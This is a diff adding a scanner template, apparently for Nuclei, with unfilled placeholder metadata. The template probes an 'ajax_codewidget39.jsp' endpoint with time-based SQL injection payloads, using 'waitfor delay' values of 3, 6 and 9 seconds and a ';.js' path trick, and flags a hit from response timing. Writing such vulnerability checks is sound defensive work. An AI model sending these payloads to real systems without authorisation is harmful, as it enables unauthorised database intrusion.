@@ -1,0 +1,26 @@
+id: fe-codewidget39-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:3%27--+"
+      - "{{BaseURL}}/common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:6%27--+"
+      - "{{BaseURL}}/common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:9%27--+"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
